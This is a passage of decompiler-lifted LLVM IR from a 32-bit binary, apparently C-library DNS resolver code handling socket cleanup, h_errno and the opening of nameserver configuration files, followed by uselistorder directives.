  br i1 %v1_8052e39, label %dec_label_pc_8052e7f, label %dec_label_pc_8052e3b

dec_label_pc_8052e3b:                             ; preds = %dec_label_pc_8052e34
  %v0_8052e3b = load i32, i32* @ecx, align 4
  %v2_8052e3b = add i32 %v1_8052e3b, -4
  %v3_8052e3b = inttoptr i32 %v2_8052e3b to i32*
  store i32 %v0_8052e3b, i32* %v3_8052e3b, align 4
  %v1_8052e3c = add i32 %v1_8052e3b, -8
  %v2_8052e3c = inttoptr i32 %v1_8052e3c to i32*
  store i32 ptrtoint (i32* @global_var_8058488.210 to i32), i32* %v2_8052e3c, align 4
  %v1_8052e41 = add i32 %v1_8052e3b, -12
  %v2_8052e41 = inttoptr i32 %v1_8052e41 to i32*
  store i32 134550743, i32* %v2_8052e41, align 4
  %v1_8052e46 = add i32 %v1_8052e3b, 184
  store i32 %v1_8052e46, i32* @esi, align 4
  %v2_8052e4d = add i32 %v1_8052e3b, -16
  %v3_8052e4d = inttoptr i32 %v2_8052e4d to i32*
  store i32 %v1_8052e46, i32* %v3_8052e4d, align 4
  %v2_8052e4e = call i32 @__pthread_return_void(i32 -1, i32 %v15_80528c0)
  store i32 %v2_8052e4e, i32* %eax.global-to-local, align 4
  %v0_8052e53 = load i32, i32* @esp, align 4
  %v1_8052e53 = inttoptr i32 %v0_8052e53 to i32*
  store i32 ptrtoint (i32* @global_var_8058488.210 to i32), i32* %v1_8052e53, align 4
  %v1_8052e5a = call i32 @__pthread_return_0(i32 -1)
  store i32 %v1_8052e5a, i32* %eax.global-to-local, align 4
  %v0_8052e5f = load i32, i32* @esp, align 4
  %v1_8052e5f = inttoptr i32 %v0_8052e5f to i32*
  %v2_8052e5f = load i32, i32* %v1_8052e5f, align 4
  store i32 %v2_8052e5f, i32* @eax, align 4
  %v3_8052e5f = add i32 %v0_8052e5f, 4
  %v1_8052e60 = inttoptr i32 %v3_8052e5f to i32*
  %v2_8052e60 = load i32, i32* %v1_8052e60, align 4
  store i32 %v2_8052e60, i32* %edx.global-to-local, align 4
  store i32 1, i32* %v1_8052e60, align 4
  %v0_8052e63 = load i32, i32* @esi, align 4
  store i32 %v0_8052e63, i32* %v1_8052e5f, align 4
  %v0_8052e64 = load i32, i32* @global_var_805eb78.271, align 8
  store i32 %v0_8052e64, i32* %ebx.global-to-local, align 4
  %v2_8052e6a = call i32 @__pthread_return_void(i32 -1, i32 %v15_80528c0)
  store i32 %v2_8052e6a, i32* %eax.global-to-local, align 4
  %v0_8052e6f = load i32, i32* @esp, align 4
  %v1_8052e6f = add i32 %v0_8052e6f, 16
  %v1_8052e72 = add i32 %v0_8052e64, -1
  store i32 %v1_8052e72, i32* @ebx, align 4
  %v1_8052e73 = add i32 %v0_8052e6f, 52
  %v2_8052e73 = inttoptr i32 %v1_8052e73 to i32*
  %v3_8052e73 = load i32, i32* %v2_8052e73, align 4
  %v5_8052e73 = sub i32 %v3_8052e73, %v1_8052e72
  %v11_8052e73 = xor i32 %v3_8052e73, %v1_8052e72
  %v12_8052e73 = xor i32 %v5_8052e73, %v3_8052e73
  %v13_8052e73 = and i32 %v12_8052e73, %v11_8052e73
  %v14_8052e73 = icmp slt i32 %v13_8052e73, 0
  %v16_8052e73 = icmp slt i32 %v5_8052e73, 0
  %v2_8052e77 = icmp eq i1 %v16_8052e73, %v14_8052e73
  br i1 %v2_8052e77, label %dec_label_pc_8052e7f, label %dec_label_pc_8052e79

dec_label_pc_8052e79:                             ; preds = %dec_label_pc_8052e3b
  %v4_8052e79 = add i32 %v3_8052e73, 1
  store i32 %v4_8052e79, i32* %v2_8052e73, align 4
  br label %dec_label_pc_8052ea0.backedge

dec_label_pc_8052e7f:                             ; preds = %dec_label_pc_8052b08, %dec_label_pc_8052e3b, %dec_label_pc_8052e34, %dec_label_pc_8052b1f
  %v1_8052e8c = phi i32 [ %v1_8052e6f, %dec_label_pc_8052e3b ], [ %v1_8052e3b, %dec_label_pc_8052e34 ], [ %v1_8052b5b, %dec_label_pc_8052b1f ], [ %v0_8052e7f.pre, %dec_label_pc_8052b08 ]
  %v1_8052e7f = add i32 %v1_8052e8c, 40
  %v2_8052e7f = inttoptr i32 %v1_8052e7f to i32*
  %v3_8052e7f = load i32, i32* %v2_8052e7f, align 4
  %v1_8052e83 = add i32 %v3_8052e7f, 1
  store i32 %v1_8052e83, i32* %eax.global-to-local, align 4
  %v1_8052e84 = ashr i32 %v1_8052e83, 31
  store i32 %v1_8052e84, i32* %edx.global-to-local, align 4
  %v1_8052e85 = add i32 %v1_8052e8c, 248
  %v2_8052e85 = inttoptr i32 %v1_8052e85 to i32*
  %v3_8052e85 = load i32, i32* %v2_8052e85, align 4
  %v5_8052e85 = zext i32 %v1_8052e83 to i64
  %v7_8052e85 = zext i32 %v1_8052e84 to i64
  %v8_8052e85 = mul nuw i64 %v7_8052e85, 4294967296
  %v9_8052e85 = or i64 %v8_8052e85, %v5_8052e85
  %v10_8052e85 = zext i32 %v3_8052e85 to i64
  %v11_8052e85 = sdiv i64 %v9_8052e85, %v10_8052e85
  %v12_8052e85 = trunc i64 %v11_8052e85 to i32
  store i32 %v12_8052e85, i32* %eax.global-to-local, align 4
  %v13_8052e85 = srem i64 %v9_8052e85, %v10_8052e85
  %v14_8052e85 = trunc i64 %v13_8052e85 to i32
  store i32 %v14_8052e85, i32* %edx.global-to-local, align 4
  store i32 %v14_8052e85, i32* %v2_8052e7f, align 4
  %v1_8052e90 = icmp eq i32 %v14_8052e85, 0
  %v1_8052e92 = icmp eq i1 %v1_8052e90, false
  br i1 %v1_8052e92, label %dec_label_pc_8052e98, label %dec_label_pc_8052e94

dec_label_pc_8052e94:                             ; preds = %dec_label_pc_8052e7f
  %v0_8052e94 = load i32, i32* @esp, align 4
  %v1_8052e94 = add i32 %v0_8052e94, 28
  %v2_8052e94 = inttoptr i32 %v1_8052e94 to i32*
  %v3_8052e94 = load i32, i32* %v2_8052e94, align 4
  %v4_8052e94 = add i32 %v3_8052e94, 1
  store i32 %v4_8052e94, i32* %v2_8052e94, align 4
  br label %dec_label_pc_8052e98

dec_label_pc_8052e98:                             ; preds = %dec_label_pc_8052e7f, %dec_label_pc_8052e94
  %v0_8052e98 = load i32, i32* @esp, align 4
  %v1_8052e98 = add i32 %v0_8052e98, 36
  %v2_8052e98 = inttoptr i32 %v1_8052e98 to i32*
  store i32 -1, i32* %v2_8052e98, align 4
  br label %dec_label_pc_8052ea0.backedge

dec_label_pc_8052ea0.backedge:                    ; preds = %dec_label_pc_8052e98, %dec_label_pc_8052b16, %dec_label_pc_8052c04, %dec_label_pc_8052e79
  %v0_8052ea0.pre = load i32, i32* @esp, align 4
  %v1_8052ea0 = add i32 %v0_8052ea0.pre, 28
  %v2_8052ea0 = inttoptr i32 %v1_8052ea0 to i32*
  %v3_8052ea0 = load i32, i32* %v2_8052ea0, align 4
  %tmp120 = icmp ult i32 %v3_8052ea0, 3
  br i1 %tmp120, label %dec_label_pc_8052900, label %dec_label_pc_8052ec5

dec_label_pc_8052ec5:                             ; preds = %dec_label_pc_805287a, %dec_label_pc_8052916, %dec_label_pc_8052a0a, %dec_label_pc_8052ea0.backedge, %entry, %dec_label_pc_8052854, %dec_label_pc_805285c, %dec_label_pc_805286a
  %stack_var_-192.0 = phi i16 [ -1, %dec_label_pc_805286a ], [ -1, %dec_label_pc_805285c ], [ -1, %dec_label_pc_8052854 ], [ -1, %entry ], [ %v0_80528c7, %dec_label_pc_8052ea0.backedge ], [ %v0_80528c7, %dec_label_pc_8052a0a ], [ %v0_80528c7, %dec_label_pc_8052916 ], [ %v0_80528c7, %dec_label_pc_805287a ]
  %v0_8052ec5 = call i32 @__GI___h_errno_location()
  store i32 %v0_8052ec5, i32* %eax.global-to-local, align 4
  %v1_8052eca = inttoptr i32 %v0_8052ec5 to i32*
  store i32 -1, i32* %v1_8052eca, align 4
  %v0_8052ed0 = load i32, i32* @esp, align 4
  %v1_8052ed0 = add i32 %v0_8052ed0, 44
  %v2_8052ed0 = inttoptr i32 %v1_8052ed0 to i32*
  %v3_8052ed0 = load i32, i32* %v2_8052ed0, align 4
  store i32 %v3_8052ed0, i32* %eax.global-to-local, align 4
  %v2_8052ed4 = add i32 %v0_8052ed0, 56
  %v3_8052ed4 = inttoptr i32 %v2_8052ed4 to i32*
  store i32 %v3_8052ed0, i32* %v3_8052ed4, align 4
  br label %dec_label_pc_8052ed8

dec_label_pc_8052ed8:                             ; preds = %dec_label_pc_8052c3d, %dec_label_pc_8052c15, %dec_label_pc_8052ec5
  %stack_var_-192.1 = phi i16 [ %stack_var_-192.0, %dec_label_pc_8052ec5 ], [ %v0_80528c7, %dec_label_pc_8052c3d ], [ %v0_80528c7, %dec_label_pc_8052c15 ]
  %v0_8052ed8 = load i32, i32* @esp, align 4
  %v1_8052ed8 = add i32 %v0_8052ed8, 20
  %v2_8052ed8 = inttoptr i32 %v1_8052ed8 to i32*
  %v3_8052ed8 = load i32, i32* %v2_8052ed8, align 4
  %v13_8052ed8 = icmp eq i32 %v3_8052ed8, -1
  br i1 %v13_8052ed8, label %dec_label_pc_8052ed8.dec_label_pc_8052eee_crit_edge, label %dec_label_pc_8052edf

dec_label_pc_8052ed8.dec_label_pc_8052eee_crit_edge: ; preds = %dec_label_pc_8052ed8
  %.pre = sext i16 %stack_var_-192.1 to i32
  br label %dec_label_pc_8052eee

dec_label_pc_8052edf:                             ; preds = %dec_label_pc_8052ed8
  %v3_8052ee2 = load i32, i32* %v2_8052ed8, align 4
  %v5_8052ee2 = add i32 %v0_8052ed8, -16
  %v6_8052ee2 = inttoptr i32 %v5_8052ee2 to i32*
  store i32 %v3_8052ee2, i32* %v6_8052ee2, align 4
  %v1_8052ee6 = sext i16 %stack_var_-192.1 to i32
  %v2_8052ee6 = call i32 @__libc_close(i32 %v1_8052ee6)
  store i32 %v2_8052ee6, i32* %eax.global-to-local, align 4
  %v0_8052eeb = load i32, i32* @esp, align 4
  %v1_8052eeb = add i32 %v0_8052eeb, 16
  br label %dec_label_pc_8052eee

dec_label_pc_8052eee:                             ; preds = %dec_label_pc_8052ed8.dec_label_pc_8052eee_crit_edge, %dec_label_pc_8052edf
  %v1_8052ef5.pre-phi = phi i32 [ %.pre, %dec_label_pc_8052ed8.dec_label_pc_8052eee_crit_edge ], [ %v1_8052ee6, %dec_label_pc_8052edf ]
  %v0_8052eee = phi i32 [ %v0_8052ed8, %dec_label_pc_8052ed8.dec_label_pc_8052eee_crit_edge ], [ %v1_8052eeb, %dec_label_pc_8052edf ]
  %v1_8052ef1 = add i32 %v0_8052eee, 12
  %v2_8052ef1 = inttoptr i32 %v1_8052ef1 to i32*
  %v3_8052ef1 = load i32, i32* %v2_8052ef1, align 4
  %v5_8052ef1 = add i32 %v0_8052eee, -16
  %v6_8052ef1 = inttoptr i32 %v5_8052ef1 to i32*
  store i32 %v3_8052ef1, i32* %v6_8052ef1, align 4
  %v2_8052ef5 = call i32 @free(i32 %v1_8052ef5.pre-phi)
  store i32 %v2_8052ef5, i32* %eax.global-to-local, align 4
  %v1_8052efa = load i32, i32* @esp, align 4
  %v2_8052efa = inttoptr i32 %v1_8052efa to i32*
  store i32 %v2_8052832, i32* %v2_8052efa, align 4
  %v2_8052efd = call i32 @free(i32 %v1_8052ef5.pre-phi)
  store i32 %v2_8052efd, i32* @eax, align 4
  %v0_8052f02 = load i32, i32* @esp, align 4
  %v1_8052f05 = add i32 %v0_8052f02, 32
  %v2_8052f05 = inttoptr i32 %v1_8052f05 to i32*
  store i32 -1, i32* %v2_8052f05, align 4
  %v0_8052f0d = load i32, i32* @esp, align 4
  %v1_8052f0d = add i32 %v0_8052f0d, 40
  %v2_8052f0d = inttoptr i32 %v1_8052f0d to i32*
  %v3_8052f0d = load i32, i32* %v2_8052f0d, align 4
  %v13_8052f0d = icmp eq i32 %v3_8052f0d, -1
  br i1 %v13_8052f0d, label %dec_label_pc_8052f61, label %dec_label_pc_8052f14

dec_label_pc_8052f14:                             ; preds = %dec_label_pc_8052eee
  %v0_8052f14 = load i32, i32* @ecx, align 4
  %v2_8052f14 = add i32 %v0_8052f0d, -4
  %v3_8052f14 = inttoptr i32 %v2_8052f14 to i32*
  store i32 %v0_8052f14, i32* %v3_8052f14, align 4
  %v1_8052f15 = add i32 %v0_8052f0d, -8
  %v2_8052f15 = inttoptr i32 %v1_8052f15 to i32*
  store i32 ptrtoint (i8** @global_var_805e728.268 to i32), i32* %v2_8052f15, align 4
  %v1_8052f1a = add i32 %v0_8052f0d, -12
  %v2_8052f1a = inttoptr i32 %v1_8052f1a to i32*
  store i32 134550743, i32* %v2_8052f1a, align 4
  %v1_8052f1f = add i32 %v0_8052f0d, 184
  store i32 %v1_8052f1f, i32* %ebx.global-to-local, align 4
  %v2_8052f26 = add i32 %v0_8052f0d, -16
  %v3_8052f26 = inttoptr i32 %v2_8052f26 to i32*
  store i32 %v1_8052f1f, i32* %v3_8052f26, align 4
  %v3_8052f27 = call i32 @__pthread_return_void(i32 %v1_8052ef5.pre-phi, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8052f27, i32* %eax.global-to-local, align 4
  %v0_8052f2c = load i32, i32* @esp, align 4
  %v1_8052f2c = inttoptr i32 %v0_8052f2c to i32*
  store i32 ptrtoint (i8** @global_var_805e728.268 to i32), i32* %v1_8052f2c, align 4
  %v2_8052f33 = call i32 @__pthread_return_0(i32 %v1_8052ef5.pre-phi)
  store i32 %v2_8052f33, i32* %eax.global-to-local, align 4
  %v0_8052f38 = load i32, i32* @esp, align 4
  %v1_8052f38 = add i32 %v0_8052f38, 56
  %v2_8052f38 = inttoptr i32 %v1_8052f38 to i32*
  %v3_8052f38 = load i32, i32* %v2_8052f38, align 4
  store i32 %v3_8052f38, i32* %edx.global-to-local, align 4
  %v1_8052f3c = add i32 %v0_8052f38, 72
  %v2_8052f3c = inttoptr i32 %v1_8052f3c to i32*
  %v3_8052f3c = load i32, i32* %v2_8052f3c, align 4
  store i32 %v3_8052f3c, i32* %eax.global-to-local, align 4
  %v1_8052f40 = sext i32 %v3_8052f38 to i64
  store i64 %v1_8052f40, i64* @global_var_805e740.269, align 64
  %v1_8052f46 = trunc i32 %v3_8052f3c to i16
  store i16 %v1_8052f46, i16* @global_var_8058484.270, align 4
  %v1_8052f4c = inttoptr i32 %v0_8052f38 to i32*
  %v2_8052f4c = load i32, i32* %v1_8052f4c, align 4
  store i32 %v2_8052f4c, i32* @eax, align 4
  %v3_8052f4c = add i32 %v0_8052f38, 4
  %v1_8052f4d = inttoptr i32 %v3_8052f4c to i32*
  %v2_8052f4d = load i32, i32* %v1_8052f4d, align 4
  store i32 %v2_8052f4d, i32* %edx.global-to-local, align 4
  store i32 1, i32* %v1_8052f4d, align 4
  %v0_8052f50 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_8052f50, i32* %v1_8052f4c, align 4
  %v3_8052f51 = call i32 @__pthread_return_void(i32 %v1_8052ef5.pre-phi, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8052f51, i32* %eax.global-to-local, align 4
  %v0_8052f56 = load i32, i32* @esp, align 4
  %v1_8052f56 = add i32 %v0_8052f56, 32
  %v2_8052f56 = inttoptr i32 %v1_8052f56 to i32*
  store i32 -1, i32* %v2_8052f56, align 4
  br label %dec_label_pc_8052f5e

dec_label_pc_8052f5e:                             ; preds = %dec_label_pc_8052dd2, %dec_label_pc_8052f14
  %v0_8052f5e = load i32, i32* @esp, align 4
  %v1_8052f5e = add i32 %v0_8052f5e, 16
  br label %dec_label_pc_8052f61

dec_label_pc_8052f61:                             ; preds = %dec_label_pc_8052eee, %dec_label_pc_8052f5e
  %v0_8052f61 = phi i32 [ %v0_8052f0d, %dec_label_pc_8052eee ], [ %v1_8052f5e, %dec_label_pc_8052f5e ]
  %v1_8052f61 = add i32 %v0_8052f61, 16
  %v2_8052f61 = inttoptr i32 %v1_8052f61 to i32*
  %v3_8052f61 = load i32, i32* %v2_8052f61, align 4
  store i32 %v3_8052f61, i32* %eax.global-to-local, align 4
  %v1_8052f65 = add i32 %v0_8052f61, 220
  %v1_8052f6b = inttoptr i32 %v1_8052f65 to i32*
  %v2_8052f6b = load i32, i32* %v1_8052f6b, align 4
  store i32 %v2_8052f6b, i32* @ebx, align 4
  %v3_8052f6b = add i32 %v0_8052f61, 224
  %v1_8052f6c = inttoptr i32 %v3_8052f6b to i32*
  %v2_8052f6c = load i32, i32* %v1_8052f6c, align 4
  store i32 %v2_8052f6c, i32* @esi, align 4
  %v3_8052f6c = add i32 %v0_8052f61, 228
  %v1_8052f6d = inttoptr i32 %v3_8052f6c to i32*
  %v2_8052f6d = load i32, i32* %v1_8052f6d, align 4
  store i32 %v2_8052f6d, i32* @edi, align 4
  %v3_8052f6d = add i32 %v0_8052f61, 232
  %v1_8052f6e = inttoptr i32 %v3_8052f6d to i32*
  %v2_8052f6e = load i32, i32* %v1_8052f6e, align 4
  store i32 %v2_8052f6e, i32* @ebp, align 4
  ret i32 %v3_8052f61

; uselistorder directives
  uselistorder i32 %v0_8052f61, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_8052f38, { 1, 0, 2, 3 }
  uselistorder i32 %v0_8052f0d, { 0, 5, 4, 3, 2, 1, 6 }
  uselistorder i32 %v0_8052eee, { 1, 0 }
  uselistorder i32 %v1_8052ef5.pre-phi, { 4, 3, 2, 1, 0 }
  uselistorder i16 %stack_var_-192.1, { 1, 0 }
  uselistorder i32 %v0_8052ea0.pre, { 1, 0 }
  uselistorder i32 %v5_8052e73, { 1, 0 }
  uselistorder i32 %v3_8052e73, { 2, 0, 1, 3 }
  uselistorder i32 %v1_8052e3b, { 0, 5, 4, 3, 2, 1, 6 }
  uselistorder i32 %v0_8052e04, { 1, 0, 2, 3 }
  uselistorder i32 %v0_8052dd2, { 1, 0 }
  uselistorder i32 %v3_8052db1, { 1, 0, 2 }
  uselistorder i32 %v0_8052da2, { 1, 0 }
  uselistorder i32 %v5_8052d98, { 1, 0 }
  uselistorder i32* %v3_8052d98, { 1, 0 }
  uselistorder i32 %v0_8052c6e81, { 0, 1, 6, 5, 4, 3, 2 }
  uselistorder i32 %v0_8052d98, { 2, 1, 0 }
  uselistorder i32 %v5_8052d92, { 1, 0 }
  uselistorder i32 %v1_8052d91, { 2, 1, 0, 3 }
  uselistorder i32 %v1_8052d8d, { 0, 2, 1, 3 }
  uselistorder i32 %v0_8052d51, { 0, 6, 1, 2, 3, 4, 5, 7, 8, 9 }
  uselistorder i32 %v7_8052d2b, { 1, 0 }
  uselistorder i32 %v1_8052d1c, { 1, 0 }
  uselistorder i32 %v0_8052cdb, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v1_8052c82, { 1, 2, 0 }
  uselistorder i32 %v0_8052c82, { 4, 1, 2, 3, 0, 5 }
  uselistorder i32 %v5_8052c5c, { 1, 0 }
  uselistorder i32 %v1_8052c56, { 2, 1, 0, 3 }
  uselistorder i32 %v0_8052c51, { 1, 2, 0 }
  uselistorder i32 %v5_8052c5c58, { 1, 0 }
  uselistorder i32 %v5_8052bfe, { 1, 0 }
  uselistorder i32 %v3_8052bfe, { 2, 0, 1, 3 }
  uselistorder i32 %v3_8052bb6, { 0, 2, 1, 3 }
  uselistorder i32 %v1_8052b9c, { 2, 3, 4, 0, 1 }
  uselistorder i32 %v0_8052b9c, { 0, 1, 9, 2, 3, 4, 5, 6, 7, 8, 10, 11 }
  uselistorder i32 %v0_8052b7b, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32 %v0_8052b5b, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32 %v0_8052b01, { 4, 0, 1, 2, 3 }
  uselistorder i32 %v0_8052ae6, { 5, 0, 1, 2, 3, 4, 6 }
  uselistorder i32 %v1_8052acf, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_8052a57, { 0, 2, 1, 3 }
  uselistorder i32 %v0_8052a44, { 3, 0, 1, 2 }
  uselistorder i32 %v1_8052a0a, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_80529eb, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v2_80529cf, { 1, 0 }
  uselistorder i32 %v3_80529c4, { 2, 3, 0, 1, 5, 4, 6 }
  uselistorder i32 %v0_80529c1, { 4, 0, 1, 2, 3, 5, 6 }
  uselistorder i32 %v0_8052966, { 5, 0, 1, 2, 3, 4 }
  uselistorder i32 %v0_8052961, { 0, 2, 1, 3 }
  uselistorder i32 %v1_805294a, { 1, 0 }
  uselistorder i32 %v1_8052916, { 3, 2, 1, 0 }
  uselistorder i32 %v0_805290792, { 2, 1, 0 }
  uselistorder i32 %v3_805291f, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9 }
  uselistorder i16 %v0_80528c7, { 4, 5, 0, 1, 2, 3, 6 }
  uselistorder i32 %v15_80528c0, { 6, 7, 4, 5, 3, 2, 0, 1, 8, 9, 10, 11, 13, 14, 15, 16, 17, 12 }
  uselistorder i32 %v2_8052832, { 3, 5, 4, 8, 1, 7, 2, 10, 0, 9, 11, 6, 12, 13 }
  uselistorder i8** %stack_var_-252, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 78, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 66, 62, 63, 64, 65, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 79, 80, 81, 82, 83, 84 }
  uselistorder i32 51, { 1, 0 }
  uselistorder i32 160, { 0, 3, 1, 2 }
  uselistorder i32 68, { 5, 0, 2, 3, 4, 1 }
  uselistorder i32 27, { 1, 2, 0 }
  uselistorder i32 112, { 0, 4, 5, 6, 2, 3, 1 }
  uselistorder i32 72, { 1, 2, 3, 0, 4 }
  uselistorder i32 (i32, i32, i32, i32)* @__libc_recv, { 4, 3, 2, 1, 0 }
  uselistorder i32 228, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32)* @__libc_send, { 4, 5, 12, 11, 10, 9, 8, 7, 6, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @__libc_connect, { 2, 4, 3, 5, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @socket, { 1, 7, 2, 6, 5, 4, 3, 8, 0 }
  uselistorder i32 17, { 13, 11, 9, 10, 4, 5, 3, 0, 14, 8, 2, 1, 12, 6, 7 }
  uselistorder i32 176, { 3, 1, 2, 0 }
  uselistorder i32 (i32)* @inet_addr, { 2, 3, 1, 0 }
  uselistorder i32 ptrtoint (i32* @0 to i32), { 3, 4, 0, 1, 2, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 17, 18, 19, 16, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 55, 56, 53, 54, 51, 52, 57, 58 }
  uselistorder i32 224, { 0, 2, 1 }
  uselistorder i32 220, { 1, 2, 0 }
  uselistorder i32 260, { 2, 1, 0, 3 }
  uselistorder i32 184, { 2, 0, 1 }
  uselistorder i32 ()* @__GI_strncat, { 1, 0 }
  uselistorder i32 268, { 1, 0 }
  uselistorder i32 200, { 1, 0, 2, 3 }
  uselistorder i32 (i8*, i32, i32)* @strncpy, { 1, 2, 3, 0 }
  uselistorder i32 104, { 2, 0, 3, 1 }
  uselistorder i32 116, { 2, 4, 0, 1, 5, 3 }
  uselistorder i32 84, { 4, 0, 5, 1, 3, 2 }
  uselistorder i32 -12, { 9, 3, 2, 4, 1, 5, 6, 7, 8, 10, 49, 48, 47, 16, 17, 11, 12, 13, 14, 15, 18, 19, 0, 20, 50, 26, 23, 21, 22, 24, 25, 29, 30, 31, 27, 28, 32, 38, 39, 37, 36, 35, 33, 34, 40, 41, 42, 43, 44, 45, 46 }
  uselistorder i32 -8, { 10, 4, 3, 5, 2, 6, 7, 8, 9, 11, 48, 43, 46, 44, 47, 49, 50, 45, 17, 18, 12, 13, 14, 15, 16, 19, 20, 21, 22, 24, 0, 23, 1, 25, 26, 27, 28, 29, 30, 35, 36, 34, 33, 32, 31, 37, 38, 39, 40, 41, 42 }
  uselistorder i32 (i32)* @__libc_close, { 13, 12, 11, 15, 19, 18, 14, 17, 16, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 -16, { 26, 27, 28, 17, 19, 20, 16, 18, 15, 21, 14, 22, 23, 24, 25, 29, 94, 95, 35, 36, 30, 31, 32, 33, 34, 37, 38, 13, 39, 40, 51, 47, 44, 45, 46, 48, 2, 1, 3, 4, 49, 43, 5, 50, 41, 42, 0, 52, 53, 57, 58, 59, 60, 61, 56, 54, 55, 6, 62, 7, 8, 65, 66, 67, 64, 68, 69, 63, 70, 9, 10, 83, 84, 85, 80, 81, 82, 79, 78, 77, 76, 75, 71, 72, 73, 74, 86, 11, 12, 87, 88, 89, 90, 91, 92, 93 }
  uselistorder i16* @global_var_8058484.270, { 2, 1, 0 }
  uselistorder i64 4294967295, { 1, 2, 0, 3 }
  uselistorder i64* @global_var_805e740.269, { 2, 1, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_805e728.268 to i32), { 4, 3, 2, 1, 0 }
  uselistorder i8** @global_var_805e728.268, { 1, 0 }
  uselistorder i32 1025, { 5, 6, 7, 1, 2, 0, 4, 3 }
  uselistorder i32 512, { 6, 3, 7, 8, 4, 5, 0, 1, 2 }
  uselistorder i8* %arg1, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_8052f61, { 1, 0 }
  uselistorder label %dec_label_pc_8052f5e, { 1, 0 }
  uselistorder label %dec_label_pc_8052eee, { 1, 0 }
  uselistorder label %dec_label_pc_8052ed8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8052ec5, { 3, 2, 1, 0, 7, 6, 5, 4 }
  uselistorder label %dec_label_pc_8052ea0.backedge, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_8052e98, { 1, 0 }
  uselistorder label %dec_label_pc_8052e7f, { 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_8052e34, { 6, 1, 2, 3, 4, 5, 0 }
  uselistorder label %dec_label_pc_8052dd2, { 1, 0 }
  uselistorder label %dec_label_pc_8052da2, { 5, 2, 6, 4, 3, 0, 1 }
  uselistorder label %dec_label_pc_8052d98, { 1, 0 }
  uselistorder label %dec_label_pc_8052d8d, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8052d8a, { 1, 0 }
  uselistorder label %dec_label_pc_8052d05, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8052c4d, { 1, 0 }
  uselistorder label %dec_label_pc_8052acf, { 1, 0 }
  uselistorder label %dec_label_pc_8052a98, { 1, 0 }
  uselistorder label %dec_label_pc_8052a0a, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8052916, { 1, 0 }
  uselistorder label %dec_label_pc_8052900, { 1, 0 }
}

define i32 @__open_nameservers() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-180 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-216 = alloca i32, align 4
  %v0_8052f70 = load i32, i32* @ebp, align 4
  store i32 134550743, i32* %stack_var_-216, align 4
  %v3_8052f7f = ptrtoint i32* %stack_var_-216 to i32
  %v2_8052f84 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8052f84, i32* @eax, align 4
  %v2_8052f8c = call i32 @__pthread_return_void(i32 %v2_8052f84, i32 134550743)
  %v1_8052f98 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8058488.210 to i32))
  store i32 %v1_8052f98, i32* @eax, align 4
  %v0_8052fa0 = load i32, i32* @global_var_805eb74.211, align 4
  %tmp43 = icmp slt i32 %v0_8052fa0, 1
  %tmp44 = icmp eq i1 %tmp43, false
  br i1 %tmp44, label %dec_label_pc_8053197, label %dec_label_pc_8052fad

dec_label_pc_8052fad:                             ; preds = %entry
  store i32 ptrtoint (i32* @global_var_80574b0.273 to i32), i32* %stack_var_-216, align 4
  %v2_8052fb9 = call i32 @__GI_fopen(i32 ptrtoint ([17 x i8]* @global_var_805747e.274 to i32), i32 ptrtoint (i32* @global_var_80574b0.273 to i32))
  store i32 %v2_8052fb9, i32* @eax, align 4
  store i32 %v2_8052fb9, i32* @ebp, align 4
  %v1_8052fc3 = icmp eq i32 %v2_8052fb9, 0
  %v1_8052fc5 = icmp eq i1 %v1_8052fc3, false
  br i1 %v1_8052fc5, label %dec_label_pc_8053162.preheader, label %dec_label_pc_8052fcb

dec_label_pc_8052fcb:                             ; preds = %dec_label_pc_8052fad
  store i32 ptrtoint (i32* @global_var_80574b0.273 to i32), i32* %stack_var_-216, align 4
  %v2_8052fd7 = call i32 @__GI_fopen(i32 ptrtoint ([24 x i8]* @global_var_805748f.275 to i32), i32 ptrtoint (i32* @global_var_80574b0.273 to i32))
  store i32 %v2_8052fd7, i32* @ebp, align 4
  %v1_8052fe1 = icmp eq i32 %v2_8052fd7, 0
  %v1_8052fe3 = icmp eq i1 %v1_8052fe1, false
  br i1 %v1_8052fe3, label %dec_label_pc_8053162.preheader, label %dec_label_pc_805318c

dec_label_pc_8053162.preheader:                   ; preds = %dec_label_pc_8052fad, %dec_label_pc_8052fcb
  %v2_8053169 = ptrtoint i32* %stack_var_-180 to i32
  %v3_805309d = add i32 %v3_8052f7f, 164
  %v0_8053162103 = load i32, i32* @edx, align 4
